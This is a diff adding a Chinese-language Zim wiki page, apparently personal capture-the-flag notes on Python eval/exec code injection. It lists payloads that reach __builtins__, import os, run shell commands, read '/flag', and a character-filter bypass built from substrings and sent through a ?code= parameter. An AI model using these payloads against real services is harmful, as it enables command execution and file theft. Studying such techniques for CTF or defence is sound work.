@@ -1,0 +1,55 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-24T22:34:05+08:00
+
+====== eval恶意代码执行 ======
+Created 星期日 24 十一月 2024
+
+eval使用逗号分隔多行指令（当作列表处理），赋值使用列表内的海象符`'':=''`：
+eval('expr1, expr2') -> list
+eval('[a:=1, b:=2]')
+
+exec支持执行多行指令，用分号隔开:
+exec('expr1; expr2')
+
+使用 ''__import__(库名)'' 动态加载库
+''eval('__import__('os').listdir()')''
+
+dir(package)  查看库里的所有方法
+
+想办法获取到''__builtins__ -> module 、 __builtins__.__dict__ -> dict''
+''__builtins__''包含的常用函数：eval、exec、open、''__import__''
+通过构造字符串，取得函数：-> function
+''__builtins__.函数名  // 不是字符串，基本用不到''
+''__builtins__.__dict__['函数名']''
+''__builtins__.__dict__.get('函数名')''
+''__builtins__.__dict__.__getitem__('函数名')''
+
+如果是别的库下的如 ''os.__builtins__ -> dict''，此时省略''__dict__''
+''os.__builtins__['函数名']''
+''os.__builtins__.get('函数名')''
+''os.__builtins__.__getitem__('函数名')''
+
+例子：
+''eval('__builtins__.__dict__["ev"+"al"](123)')''
+''__builtins__.eval('cmd')''
+''__builtins__.__import__('os').system('ls') 无返回值''
+''__builtins__.__import__('os').listdir() 返回列表''
+''__builtins__.__import__('os').popen('cat /flag').read() 返回字符串''
+''__builtins__.__dict__.__getitem__('open')('/flag').read() 返回字符串''
+
+
+os.listdir() -> list
+os.system(cmd) -> None
+os.popen(cmd).read() -> str
+open('file', 'r').read() -> str
+
+奇淫技巧：
+* 如果对输入字符有过滤，可以通过对合法字符取子字符串，构造恶意代码
+	* ''eval(code)''
+	* ?code=''gmpy2.__builtins__['eval'](__i('os').f())''  注意内层eval里不需要带引号相当于
+	* ?code=''gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'('+"'"+'cos'[1]+'cos'[2]+"')."+'erf'[2]+'()')''
+	* 注意+要编码成%2B
+
+整理：
+{{.\pasted_image.png}}
